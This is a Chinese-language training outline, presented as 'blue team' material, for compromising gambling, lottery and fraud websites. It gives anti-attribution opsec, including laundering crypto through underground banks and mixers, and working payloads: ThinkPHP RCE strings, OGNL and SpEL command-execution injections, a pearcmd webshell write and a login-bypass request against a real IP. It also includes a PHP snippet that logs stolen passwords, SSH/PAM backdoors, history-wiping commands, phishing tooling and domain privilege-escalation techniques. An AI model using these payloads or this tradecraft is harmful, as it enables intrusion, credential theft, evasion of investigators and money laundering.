# 蓝军培训大纲

> 来源: 飞书文档思维导图

## （反)溯源技巧

### 工作环境配置

#### 主机硬盘加密

- veracrypt
  - [https://www.veracrypt.fr/en/Downloads.html](https://www.veracrypt.fr/en/Downloads.html)
#### 虚拟机环境配置

- 删掉蓝牙、NAT网卡
- shadow defender
- 共享文件夹挂载放置文件
- 渗透机和报告机分开
- wps不允许同步文档
- mybase
  - keepass
#### 个人信息清理

- 不允许使用个人id
- 不允许使用历史密码
- 不允许使用历史账号
- 账号一次一扔
- 创建匿名邮箱
  - protonmail
    - [https://protonmail.com/](https://protonmail.com/)
  - outlook
    - [https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&sdf=0](https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&sdf=0)
- 创建接码平台账号
  - [https://sms-activate.io/](https://sms-activate.io/)
- 设备购买（二手）
  - 设备id
  - wifi bssid
    - netsh wlan show networks mode=bssid
- 手机卡购买
  - 线下
  - 副卡
- tg购买
  - no自己手机号
- 虚拟币
  - 冷钱包/现金（境内地下钱庄交易）->u->多币种混币->u
    - 匿名洗钱损耗7%-10%
      - 洗钱公司、地下钱庄加上佣金损耗在30%
#### 安卓虚拟机+实体机

#### 在对谁进行反溯源

- bc包网
  - ip
    - 账号
#### 做了哪些链路

#### 链路每一跳泄露了哪些信息

#### 谁能拿到这些信息

#### 时间成本？

#### 需要的权限

### 网络环境配置

#### 匿名工作链路配置

- 匿名主机环境选购
  - 非大陆地区
    - shockhosting
    - [psychz.net](http://psychz.net)
    - no香港阿里云
    - 亚马逊云
    - cf
    - jtti.cc
  - 最好支持usdt
  - 主机不选择同一主机商
- 链路搭建
  - 境外流量卡->frp->softether vpn->lunaproxy(动态住宅代理)
  - [https://github.com/SoftEtherVPN/SoftEtherVPN_Stable](https://github.com/SoftEtherVPN/SoftEtherVPN_Stable)
  - 境外流量卡->lunaproxy->流量代理
    - [https://suying999.net/auth/login](https://suying999.net/auth/login)
  - 境内流量卡->softether vpn->流量代理
  - 匿名流量设备
- vpn配置及痕迹清理
### 渗透环境及工具配置

#### 创建账号

- github
- [https://securitytrails.com/](https://securitytrails.com/)
  - 全球最大情报商
- [https://search.censys.io/](https://search.censys.io/)
  - 每天更新
    - rustscan
- fofa/hunter（不允许实战虚拟机内登录）
#### 工具

- ffuf
- 网盘打包
  - [https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d](https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d)
#### 字典

- [https://github.com/9bie/dict](https://github.com/9bie/dict)
- [https://github.com/SexyBeast233/SecDictionary](https://github.com/SexyBeast233/SecDictionary)
- [https://github.com/r00tSe7en/MyDict](https://github.com/r00tSe7en/MyDict)
### [https://lcx.cc/post/3213/](https://lcx.cc/post/3213/)

### 包网

#### 金主->提供建站服务/开发

- 代码+搭建
- 代码+搭建+运维
- 自建站
- bc->页面关联一大批站点
### 反间防谍

#### 商业间谍(内容已删除)

- 如何买通内鬼
- 商业咨询公司套路
- 如何卖掉内鬼
- 如何查处内鬼
- 料子上下游分析溯源
#### 地缘对抗|不同政体间谍（内容已删除）

## **信息收集**

### 网站信息收集

#### sgk 数据来源收集

- [https://breachforums.st/member?action=login](https://breachforums.st/member?action=login)
- potato
- 蝙蝠
- 海鸥
- 事密达
- tg
  - 买临时账号刷社工库次数
- signal
- discord
- whatsapp
- Jabber
- session
- matrix
- simplex
#### 拿到站看什么

- paramspider做字典
  - to do
#### 开源信息收集

- github
  - 关键字
    - ldap
      - 结合域名资产信息
        - 内网资产信息
    - login
    - 小业务
    - 项目关联->账号下的信息
    - 拼音（缩写）
    - 子域名
    - 内网域名
    - com.xxx
    - 中文
    - js/css/html/特殊文件名
  - 人物关联
    - star
    - fork
    - commit
    - follow
- [https://securitytrails.com/](https://securitytrails.com/)
  - 子域名
- fofa/hunter/...
  - ico
  - title
  - body
  - 找源码
    - 扫备份
      - 黑盒->白盒
- gitee/看云/语雀/[hackmd.io/石墨](http://hackmd.io/石墨)
  - site:"[yuque.com](http://yuque.com)" "xxx"
- 新闻
  - [https://sigma.world/zh-hant/cis/floor-plan/](https://sigma.world/zh-hant/cis/floor-plan/)
- google语法
  - duckduckgo
    - site:[xxx.com](http://xxx.com) -www -fare -css -parking
- hackone/[https://zeroday.hitcon.org/](https://zeroday.hitcon.org/)
- Twitter/facebook/linkin
  - 员工
    - 初始密码有规则
- 网盘
  - 第三方
- medium
  - 不强制
    - 开会员
#### 供应链信息收集

- 供应商大会
  - 海外企业
- 招投标
- 页面特征
  - js/css/html
#### osint 信息收集

- [https://securitytrails.com/](https://securitytrails.com/)
- [https://search.censys.io/](https://search.censys.io/)
  - 每天扫端口
    - 时效性很强
      - 但是偶尔会有遗漏，不全
- rapid7 dns
  - 本地搭建clickhouse
- [https://idc.ip138.com/idc/](https://idc.ip138.com/idc/)
- asn
- 页面特征找源码
- 接口特征找源码
- 联系方式找源码
#### bypass cdn

- 页面特征找真实ip
- 历史解析找真实ip
- 其他业务关联ip段找真实ip
### 建站公司实战溯源

#### BC 包网溯源

- 同cdn
- 同dns
- 同机房
- 同页面特征找测试站域名ip关联到包网
- 同关键字特征域名模糊搜索
- 找客服对模版
#### 团伙人员信息溯源

- 历史发帖关联账号
- 特殊id
- sgk
- 文件元数据
- 钓鱼
### 渗透打击突破思路及方法

#### 黑盒快速打点思路

- BC 站点
  - _
    - 渗透
      - 判断版本
      - 本地搭建
      - 工具
        - 漏洞
        - 漏洞需要权限
        - 漏洞原理
        - 抓包
          - 自己改
    - 信息收集
    - 漏洞积累
      - ​[漏洞积累](https://ot8oa9a41m.feishu.cn/docx/IfLOdfra7oxJrHxHB6qc7Dx8nux)​
  - 活动站
    - 注入
      - sqlmap改
        - 指定了数据库、指定了表
          - 去掉所有的探测内容
    - 备份文件
    - 框架漏洞
      - rce/反序列化漏洞
      - 上传
      - 任意文件读/写
      - github\google
      - [https://xvi.vulbox.com/](https://xvi.vulbox.com/)
    - 临时搭建
      - 打下后需翻文件横向移动
        - mq
          - 钓鱼
      - 之前
      - 打包卖的
        - 易搜索
          - 跟实际站点一起
      - 很少
    - 收集域名资产进一步扩展
      - 多个包网分站公用一个活动站
      - 使用包网相关域名
  - 客服站
    - xss
      - 钓鱼
      - electron rce
      - 买的源码自己搭的
      - markdown
        - 标签
    - 找客服系统供应商套路测试站、源码
    - 找后台
    - 扫目录
    - 通过客服站资产归因包网资产
      - 94chat
    - 套路客服获取站点更多信息
    - 拿下客服站并不能拿下核心数据
  - 页面特征找关联站
    - js
    - js console
    - 静态资源加载
    - wss
    - 不靠谱
  - 干包网
    - 运维服务
      - Jenkins
      - 各类国产oa管理软件
      - mq
    - 测试站
      - 弱口令
      - getshell
        - 横向
        - 挂马钓鱼
          - yun
            - 客户机
        - 拿源码
        - 报错调试
      - 收集后台接口
        - ../../../
      - 源码二道贩子
        - 简单聊一下
        - 扫备份
        - 黑盒
        - 根据后台页面加载资源找更多的页面特征
          - money.php
          - 后台调试报错
            - 特殊的数据库表名、文件名
    - 历史边缘资产
      - 包网很难找
    - bbscan找备份快速代码审计
      - 备份只适用于本站
        - 后台api，后端文件名
    - 越权有意义吗？
      - 后台多个管理账号情况下
      - 垂直越权
        - 更多接口权限
      - 水平越权
        - 全站
      - 信息收集、黑盒、白盒、内网
        - 攻击对
          - 分工明确
          - 企业雇员
        - 独立完成一个目标从头到尾
        - CaA
        - burp、yakit
          - cpacha_killer_modify
          - burp无法抓包，指纹被识别，改tls
          - 选基础的
          - poc验证
            - 扫描器开发
              - 尽量不要带攻击特征
              - 发包内容无害化
  - 目标是什么
    - 打下包网
      - 控制所有数据
      - 维权
      - 供应链
        - 客户账密支付信息
      - 控制台子权限
      - 获取源码
      - 控运维、开发，最差控客服
      - 是否需要往下控客户
        - f2a验证
          - 绑https
          - google验证码
          - 手机绑定
          - 微软auth
        - ip白名单
          - xff头
          - 有漏洞改配置
        - 登录ip
        - chrome remote debug
        - cookie/storage
  - 四方支付/外接台子 ---换目标了
    - login proxy
      - 用户名变化
      - 加载资产变换
      - 新的域名特征无法关联回源站
    - 找框架
    - 找资产
    - 找漏洞
  - 大的更大，小的更小
    - 买bc拍照
      - 正式化、公司化、规模化
        - azure
        - 云应用
        - 难度大、时间成本高
          - 长期坐牢、打击积极性
    - 原来的盘子被打了
      - 卖源码
        - 老旧
          - 前端不靠谱
            - 后台代码被改了
              - uniapp前端
                - 雇私人开发
                  - 后端|api|文件名xxx.php
        - 代码不完整
          - 脱下来的代码
            - 没有完全解密
        - 逻辑有问题
          - 采集器
            - 正规采集数据
            - 加自己能控制的彩种、局数
      - 信用盘|娱乐城
        - 主要目标
      - QB
        - 试用期6个月
          - 打穿并长期驻留
      - 区块链
        - web3
        - 杀猪盘
          - btc赌局
      - tg bot
      - 原来老板不干了
        - 手底下人转卖
          - 原来没什么漏洞
          - 源码会不会有后门
      - 微盘
        - 精聊
- cp
  - 注入
    - 投注环节sql注入
      - 接外部彩票接口，本体站点自行搭建
      - 前后端加密
    - 签到注入
    - 轮盘活动
    - orderby=rand(1=1)
  - 客服站
    - 邀请码
    - 53
    - meiqia
  - 导航站
  - 聊天室
    - xss
      - ws
    - 找包网
  - 图片站
    - 找包网
    - [img.xxx.com](http://img.xxx.com)
      - 管理系统
  - 编辑器
    - 任意文件上传
    - xss
    - ueiditor
      - php
        - ssrf
          - 内网存活端口
          - 真实ip
            - dns
            - 176.xxxx
      - dotnet
        - 上传
  - 积分系统
    - 废弃了
  - 演示站
    - 打源码
  - 报错信息
    - json闭合
    - 变量名数组
      - word[]=xxx
        - java\php\中间件
          - cf
  - 多端口
    - 高端口开其他服务
      - 真实ip
      - 绑定不同域名
    - ngnix反带
      - 80-30000+
  - 搭建宝塔/护卫神
    - 靶场练习
      - 注入
      - 上传
      - 改密码
      - 关服务
  - 脱裤
    - adminer
    - 拖到服务器上分片传输
      - web目录
      - github lfs
        - action
  - 反序列化
    - CI
      - [https://guokeya.github.io/post/lQXYmp8_4/](https://guokeya.github.io/post/lQXYmp8_4/)
      - gzip test.phar
  - 国内主流域名
    - 常见src
    - bc站、zp站
      - 通过特征批量收集到
    - 爬虫
      - 做字典
- zp
  - 本站快速打点
    - 目录
    - 端口
    - 弱口令
    - bbscan找备份快速代码审计
    - 头像上传
    - 语音朋友圈上传
      - 钓鱼
        - SH
    - 裸聊、同城免费
      - 做任务刷单
  - n个网站
    - 1-2月
  - 半年-1年
  - php
    - 变量覆盖
  - 路由
    - filter、waf、
    - 提出来扫一遍
  - 漏洞点
    - 配置文件
      - 硬编码
        - cookie伪造
    - 危险函数
      - debug
        - 黑百合
    - 怎么触发需要什么条件
      - 路由
      - 权限
  - 临时买服务器
    - ram
      - 必须绑mfa
        - [https://auth.ping8.top/](https://auth.ping8.top/)
          - 导出用户名：secret
#### 常见漏洞原理及利用工具与思路

- 漏洞利用思路
  - 组件
    - 源码
      - 开源
      - 备份
      - 套路客服测试站
      - 网盘泄露
      - 测试多个版本
      - 商业版需破解
        - 加解密
    - php漏洞
      - 23、24
        - cgi-bin
          - XAMPP
  - 版本
    - 更新时间
    - 修复日志
      - 修复方式？绕过
    - 影响范围
    - 商业版与开源版差异
      - hw
  - poc获取
    - github
    - 博客
    - 源码自行分析
      - 没出exp
        - 根据补丁自行分析
    - 工具抓包提取
  - 原理
    - 漏洞点
    - 利用条件
    - 产生不良后果
    - 请求路由
      - 二次开发
  - 实战化改造
    - 本地环境搭建
    - 不出网
    - .net core
      - 内存马
- 常用漏洞
  - sql注入
    - 不要用sqlmap
    - 自己写脚本
    - 是否站库分离
    - 是否有写权限
    - 是否可以执行命令
      - oracle
        - 19c
          - sys
    - 不可破解就写入后台账密or配置参数（文件类型）or改写秘钥
      - Bcrypt
      - 上传文件类型
    - [https://github.com/r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri)
  - 任意文件读取
    - 读敏感文件
      - 能否列目录
      - windows能否跨盘符
      - .bash_history
      - .viminfo
      - 源码、配置文件、日志、启动脚本
      - /proc/net/
      - /proc/self/
      - /proc/pid/
  - 任意文件上传
    - 目录
      - 是否返回目录
      - /var/www/[www.xxx.com/img/xxx.php](http://www.xxx.com/img/xxx.php)
        - [www.xxx.com/limg/xxx.php](http://www.xxx.com/limg/xxx.php)
    - 上传oss
    - 上传本地|跨盘符
    - 配合任意文件包含
  - docker
    - 判断环境
      - .dockerenv |ls -alh /.dockerenv|cat /proc/1/cgroup|mount | grep "docker"|fdisk -l|ps -aux
    - cat /proc/self/status | grep Cap
      - 特权模式将宿主机挂载
      - 0000003fffffffff
    - Registry API 未授权访问漏洞利用
      - [https://github.com/Soufaker/docker_v2_catalog](https://github.com/Soufaker/docker_v2_catalog)
    - remote api未授权
      - 2375
        - docker -H tcp://<target>:2375 ps -a
    - [https://github.com/teamssix/container-escape-check](https://github.com/teamssix/container-escape-check)
    - [https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)
  - ssrf
    - [http://100.100.100.200/latest/meta-data](http://100.100.100.200/latest/meta-data)
    - [http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role](http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role)
    - [http://metadata.tencentyun.com/latest/meta-data/](http://metadata.tencentyun.com/latest/meta-data/)
    - oss brower、cf
    - [https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html](https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html)
  - php配置文件写入
    - '); phpinfo(); /*
    - 变量覆盖
  - 只给一个登录口怎么玩
    - 面试经典问题
      - 考发散思维
    - ip
    - 域名
    - 谷歌搜索提及网站的历史文章
      - wayurl
    - js\目录\接口\参数爆破（arjun、hae）
    - 注入
      - .net
    - 注册
    - github找登录脚本
    - 爆破jwt
    - help文档
    - [https://github.com/cws001/swagger-exp-knife4j](https://github.com/cws001/swagger-exp-knife4j)
  - TP
    - 工具
      - [https://github.com/bewhale/thinkphp_gui_tools](https://github.com/bewhale/thinkphp_gui_tools)
    - 日志
    - debug
    - rce
      - 高版本
    - 多语言
      - docker
    - 注入
      - 3.2.3、3.2.5
  - tg信息收集
    - 钓鱼页面
      - linkedin
        - 邮箱
        - 电话
      - evilginx
  - 收集包网信息
    - 菲律宾、台湾
- ssh后门
  - tsh
    - 内网机器
    - 产生外网连接
    - vps机器不能掉
  - PAM
    - 测试好版本
    - 保持好连接不能掉
  - [https://github.com/9bie/sshdHooker](https://github.com/9bie/sshdHooker)
- 找文件
  - [https://github.com/AabyssZG/FindEverything](https://github.com/AabyssZG/FindEverything)
    - 扩写自己喜欢的版本
- 痕迹清除
  - windows
    - [https://github.com/r00tSe7en/ShadowlessFeet](https://github.com/r00tSe7en/ShadowlessFeet)
#### 痕迹清理

- unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
- 修改文件时间
- 内网探测逻辑
  - 内网严禁扫描
  - 按照机器逻辑访问内网
  - 根据内网连接探测内网
- 脚本作业
  - 单线程
  - 扫单个端口
  - ip地址随机
  - 扫描后有随机时延
## **代码审计 **

### 实战 java 代码审计

#### BC 站源码审计 getshell 实战

- pom
  - sql注入
    - mybatis
      - 类型严格
      - order by ${time}
      - LIKE '%${stuName}%'
      - in (${id})
      - 直接调用语句
      - OGNL注入
        - <select id="getUserByUserName" parameterType="String" resultMap="User">    select * from users where username like ${username}</select
        - OgnlCache.getValue
          - **parseExpression**
            - ${@java.lang.Runtime@getRuntime().exec("whoami")}
            - ${@java.lang.Thread@currentThread().sleep(9000L)}
        - [https://commons.apache.org/dormant/commons-ognl/language-guide.html](https://commons.apache.org/dormant/commons-ognl/language-guide.html)
        - [https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md](https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md)
  - 反序列化
    - fastjson
      - 不能打也确定有cc链
    - shiro
    - log4j
    - 根据依赖和版本确定能打哪条链子
    - 所谓的工具熟悉
      - 知道漏洞原理
      - 有poc
      - 能改poc(链子)
    - JasperReports
  - SSTI模板注入
    - thymeleaf
      - [https://www.thymeleaf.org/documentation.html](https://www.thymeleaf.org/documentation.html)
        - $
        - *
        - ~
      - SPEL表达式执行
        - [https://itmyhome.com/spring/expressions.html](https://itmyhome.com/spring/expressions.html)
        - 前提条件
          - 传入的表达式无过滤
          - 表达式解析之后调用了getValue/setValue方法
          - 使用StandardEvaluationContext（默认）作为上下文对象
      - __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
        - templateName
  - 组件弱口令/未授权
    - durid
      - 未授权
      - rce
    - swagger-ui
    - xxl-job
  - 组件版本
  - 功能模块
- filter
  - 缺陷导致目录穿越
    - 越权
  - xss
- 路由
  - 黑百盒结合跑未授权接口
    - 简单分析状态码
- LICENSE
  - 看框架
- 功能模块梳理
- 登录功能
  - 绕过登录
    - GET /api/admin/login/../../../api/userBill/export  HTTP/1.1Host: 3.1.181.69:8080Accept: application/json, text/plain, */*x-api-idempotent: bfe3cd31-cf0c-4ac5-a1ba-f9886f5b556dAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36Referer: [http://3.1.181.69:8080/Accept-Encoding:](http://3.1.181.69:8080/Accept-Encoding:) gzip, deflate, brConnection: keep-alive
  - secret硬编码
    - 查看token、cookie生成方法
      - 伪造token、cookie
  - 伪随机(语言不同，思路一致)
    - [https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html](https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html)
      - django-simple-captcha
        - seed相同时，两次获取随机数是完全一样的
          - random.seed()设置种子会作用于整个进程 也就是说，我们通过获取验证码的请求来设置随机数种子，那如果后续找回密码的请求也经过我们这个进程，就会使用我们设置的种子来产生随机数
- 未授权、可控制权限接口功能
  - 上传
  - 注入
    - [https://www.yangdx.com/2022/05/211.html](https://www.yangdx.com/2022/05/211.html)
  - xxe
    - 能rce?
    - file ftp mailto http https jar netdoc
  - 文件操作
  - ssrf
- 粗糙waf语句
  - 通常在filter
    - 规则不严绕waf
    - 找没有在filter规则内的接口
- [https://blog.csdn.net/sdnuwjw/article/details/103536816](https://blog.csdn.net/sdnuwjw/article/details/103536816)
#### cp 站源码审计 getshell 实战

- 在线反编译
  - [http://www.javadecompilers.com/](http://www.javadecompilers.com/)
  - [http://www.decompiler.com/](http://www.decompiler.com/)
  - [https://devtoolzone.com/decompiler/java](https://devtoolzone.com/decompiler/java)
  - [https://jdec.herokuapp.com/](https://jdec.herokuapp.com/)
  - [https://www.mobilefish.com/services/java_decompiler/java_decompiler.php](https://www.mobilefish.com/services/java_decompiler/java_decompiler.php)
  - [http://javare.cn/](http://javare.cn/)
- 快速找关键字
  - [https://github.com/Ppsoft1991/CodeReviewTools](https://github.com/Ppsoft1991/CodeReviewTools)
  - [https://github.com/4ra1n/code-inspector](https://github.com/4ra1n/code-inspector)
  - [https://github.com/jar-analyzer/jar-analyzer](https://github.com/jar-analyzer/jar-analyzer)
  - [https://github.com/ax1sX/RouteCheck-Alpha](https://github.com/ax1sX/RouteCheck-Alpha)
- 实战案例（已删除）
- 确认存在漏洞后根据路由及页面特征找存活站
- [https://github.com/blackorbird/APT_REPORT](https://github.com/blackorbird/APT_REPORT)
- [https://github.com/timwhitez/Doge-DNSptr](https://github.com/timwhitez/Doge-DNSptr)
- [https://github.com/bit4woo/knife](https://github.com/bit4woo/knife)
#### java反序列化

- classloader
  - BootStrap ClassLoader(-Xbootclasspath)
    - rt.jar
      - java.lang, [java.io](http://java.io/)
    - resources.jar
    - charsets.jar
  - Ext ClassLoader(-D java.ext.dirs)
  - App ClassLoader(-classpath)
  - AppClassLoader的父亲(不是父类)是ExtClassLoader
    - AppClassLoader 的类: class jdk.internal.loader.ClassLoaders$AppClassLoader
    - ExtClassLoader 的类: class jdk.internal.loader.ClassLoaders$PlatformClassLoader  // JDK 8+ 中为 PlatformClassLoader
    - AppClassLoader 的父类: class jdk.internal.loader.URLClassLoader
    - ExtClassLoader 的父类: class jdk.internal.loader.URLClassLoader
  - AppClassLoader, ExtClassLoader都是属于sun.misc.Launcher类中的一个成员类
  - 顶级父类加载 -> 父类加载 -> 加载不到再本地加载
    - 本类加载 -> 加载不到再父类加载
      - 自定义 ClassLoader
        - loadClass（加载指定的Java类）如果自定义 ClassLoader 重写 loadClass 方法, 那么将打破双亲委派机制! 因为双亲委派机制是在 loadClass 方法上产生的.
        - findClass（查找指定的Java类）
        - findLoadedClass（查找JVM已经加载过的类）
        - defineClass（定义一个Java类）如果调用到任意 ClassLoader 的 defineClass 方法, 并传入相应的字节码, 那么 JVM 便加载该类 (如果该类继承 | 实现了某个类 | 接口, 那么会先加载父类 | 接口). 唯一一点是自定义ClassLoader加载某个类时, 类包名不允许以java.打头, 否则会抛出异常.
        - resolveClass（链接指定的Java类）
        - webshell定义了equals方法, 调用fillContext函数将马子中传递过来的pageContext传入过来了, 随后通过pageContext得到WEB中request, response, session对象
  - BCEL ClassLoader
    - com.sun.org.apache.bcel
      - 包含在jdk中
        - JDK < 8u251
          - rt.jar
      - tomcat7: [org.apache.tomcat.dbcp.dbcp.BasicDataSource](http://org.apache.tomcat.dbcp.dbcp.basicdatasource/)
      - tomcat8 及其以后: [org.apache.tomcat.dbcp.dbcp2.BasicDataSource](http://org.apache.tomcat.dbcp.dbcp2.basicdatasource/)
      - 在loadClass()方法中，createClass()通过subString()截取$$BCEL$$后的字符串，并调用Utility.decode进行相应的解码并最终返回改字节码的bytes数组。之后生成Parser解析器并调用parse()方法进行解析，生成JavaClass对象。之后获取到了该JavaClass对象的bytes数组并调用java原生的defineClass()加载，从而实现类加载。
- 命令执行
  - 直接或间接调用newTransformer或getOutputProperties方法，最终进入defineTransletClasses方法，将_bytecodes字段中存储的类的bytecode重新在JVM中定义为类，最终在对其调用newInstance方法时，触发写在该类static块或者无参构造方法中的代码块
- cc
- c3p0
- 0XACED005
### 实战 php 代码审计

#### BC 站源码审计 getshell 实战

- 安装
  - composer
  - git
  - 手拖安装包
  - docker
- tp3/5区别
  - 3
    - 目录开头大写
  - 5/6
    - 目录开头小写
  - log日志存放位置不同
- 架构
  - runtime
    - 网页缓存
      - Cache::set
    - session
      - log->session id
  - application/6-app
    - 存放项目源码
  - thinkphp
    - 框架源码
    - 6-/vendor/topthink/framework/src/think
  - vender
    - composer安装的扩展库
  - extend
    - 手动安置的第三方库or自己封装的库
- 路由模式
  - tp3
    - # tp3.2.* /ThinkPHP/Conf/convention.php return array( 'URL_MODEL'              => 1, //URL模式： 0 (普通模式)；1 (PATHINFO 模式) 默认；2 (REWRITE  模式)；3 (兼容模式) // 静态路由： 'URL_ROUTER_ON' = false, 'URL_ROUTE_RULES' = array(), )
  - tp5
  - tp6
    - 无需配置可基于pathinfo和兼容模式访问。只支持路由配置，自设动态路由和静态路由规则，通过Route类设定。开启强制路由的话，所有访问必须通过路由规则才能访问成功。配置路径为/config/route.php
      - Route::get
      - Route::rule
      - Route::xxx
- sql注入
  - count和max方法未过滤调用parseKey
    - 5.0.0/5.0.23/tp3
  - ThinkPHP/Library/Think/Model.class.php::_parseOptions直接拼接PDO参数$option
  - ThinkPHP\Library\Think\Db\Driver.class.php的parseWhereItem直接拼接处理where查询表达式
    - bind表达式：ThinkPHP <= 3.2.4
    - between表达式：ThinkPHP 3.1.*-3.2.0
    - eq/neq/gt表达式：ThinkPHP 3.2.*
    - id[]=bind&id[]=1%27&tel[]=112312616&email=admin@emal.com
  - thinkphp/library/think/db/Builder.php的parseData方法未过滤调用parseKey
    - 5.0.13<=ThinkPHP<=5.0.15（inc/dec），5.1.0<=ThinkPHP<=5.1.5（exp/inc/dec）
    - username[0]=exp&username[1]=updatexml(1,concat(1,user(),1),1)&username[2]=2
  - 投注
    - 新闻已浏览
      - 签到|活动
        - 大转盘
- rce
  - Request::__construct变量覆盖+Request::input代码执行
    - ThinkPHP [5.0.0, 5.0.23]
    - 利用条件
      - trace+强制路由（url_route_on和url_route_must开启）
        - _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
      - debug+url_route_on路由开启（默认）
        - _method=__construct&filter[]=system&get[]=id
      - $dispatch['method']+url_route_on路由开启（默认）
        - ?s=captcha_method=__construct&filter[]=system&method=get&get[]=id
  - $dispatch['module']混合模式下未过滤控制器App::invokemethod反射可调用任意类导致代码执行
    - ThinkPHP [5.0.0, 5.0.23], ThinkPHP [5.1.0, 5.1.30]
    - 默认开启url_route_on配置（混合模式）
    - /public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
  - think\process\pipes\Windows:__destruct 任意文件删除
  - LoadLangPack.php::switchLangSet() 多语言模式包含
    - 版本范围：ThinkPHP v6.0.1-v6.0.13，v5.0.x，v5.1.x
    - 直接RCE需要docker部署框架，并且需要php开启pear扩展（编译的时候有--with-pear配置）或者直接安装pear扩展的php并开启，包含该文件即可
    - 步骤
      - GET /index.php?+config-create+/&lang=../../../../../../../../../usr/local/lib/php/pearcmd&/+/<?=phpinfo();?>+/tmp/test.php HTTP/1.1
      - GET /index.php?lang=../../../../../../../../tmp/test HTTP/1.1
  - View::assign() 模板文件 变量覆盖+文件包含
    - 版本范围：ThinkPHP 3.2.*, ThinkPHP  [5.0.0, 5.0.18], ThinkPHP [5.1.0, 5.1.10]
    - 条件
      - 通过View::assgin()给模板赋值的变量或变量内容可控。
      - 需要配合上传图片马或者日志文件、备份文件等，伪造正常文件，然后再请求包含
- 鉴权
  - Route类动态参数
    - Route::get('view/:name$', 'News/read')->option('rule', 'admin');
  - 2. 设置鉴权中间件（路由白名单）
    - Route::rule('hello/:name','hello')->middleware('Auth');
  - 3. 前后置行为检测：beforeAction和afterAction
  - 4. 验证码登录
  - 5. 实现auth类和基于RBAC的第三方鉴权库
- file_get_content
  - 任意文件读取
  - ssrf
    - fsockopen
    - readfile
    - fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf
    - file
    - highlight_file/show_source
    - parse_ini_file
    - simplexml_load_file
  - curl
  - php:input
    - /etc/passwd
- extends
  - 鉴权类
    - 没有就可以未授权
      - 但是要路由可访达
- 文件上传
  - 临时文件
    - 条件竞争
  - 后缀名判定
  - phpinfo
    - 写文件
- xss打后台
  - 银行卡
  - xss 接收平台
- is_dir/unlink
  - 文件操作函数触发phar反序列化
    - CI4
  - unlink删除一些lock文件
    - 鸡肋
- xss
  - htmlspecialchars默认不转义单引号
  - 多次编码转换
#### cp 站源码审计 getshell 实战

#### zp 站源码审计 getshell 实战

#### 通达oa历史漏洞

#### 商业加密php代码/iot设备的php管理页面

- hook php dll函数dump明文
- 内存dump明文
### 实战.net 站点代码审计

#### java内存马

- 加载过程
  - tomcat架构
  - 加载的安全机制
- 广泛性
- 反射和shell的区别
#### .net内存马

- [https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ](https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ)
## **后渗透横向移动 **

### 服务器及个人 pc 信息收集工具及方法

#### bypass edr 获取 hash

- 基础
  - ntlm
    - winlogon.exe -> 接收用户密码 -> lsass.exe -> 比对sam表
  - 黄金票据
  - 白银票据
  - 钻石票据
  - 蓝宝石票据
  - 非约束委派
  - 约束委派
### 域提权方式

#### 通过 wsus、sccm 提权

- [https://github.com/AlsidOfficial/WSUSpendu](https://github.com/AlsidOfficial/WSUSpendu)
  - 域内补丁更新服务器，原理类似edr总控下发文件命令
- [https://github.com/xpn/sccmwtf](https://github.com/xpn/sccmwtf)
  - 推powershell
#### 通过 azureAD 提权

- Azure AD Sync
#### 打邮服

- 域管登录过
- 翻邮件
- 有WriteACL权限，直接给自己dsync权限
  - [https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
#### 堡垒机/运维机

#### web后门偷密码

- if ($_SERVER['REQUEST_METHOD'] == 'POST') {      $username = $_POST['username'];    $password = $_POST['password'];      $data = $username . ':' . $password . PHP_EOL;   file_put_contents('users.txt', $data, FILE_APPEND | LOCK_EX);
#### 抓取域管登陆服务器的hash

#### 找密码本

#### 找特权组用户

- Administrator
- Backup Operators
#### CVE-2014-6324（MS14-068）

- 利用前提
  - 域控没有打MS14-068的补丁(KB3011780)
  - 拿下一台加入域的计算机
  - 有这台域内计算机的域用户密码和Sid
- 漏洞原因
  - Client在发起认证请求时，通过设置include-PAC为False,则返回TGT中不会包含PAC
  - KDC对PAC进行验证时，对于PAC尾部的签名算法，允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。因此伪造的任意内容都可以是合法的，直接加上内容的MD5值作为签名即可
    - 构造高权限PAC
      - 512、520、518、519
  - PAC没有被放在TGT中，放在其它地方。KDC在仍然能够正确解析出没有放在TGT中的PAC信息PAC必须是密文，经过Key加密的KDC会从Authenticator中取出来subkey，把PAC信息解密并利用客户端设定的签名算法验证签名
    - enc-authorization-data
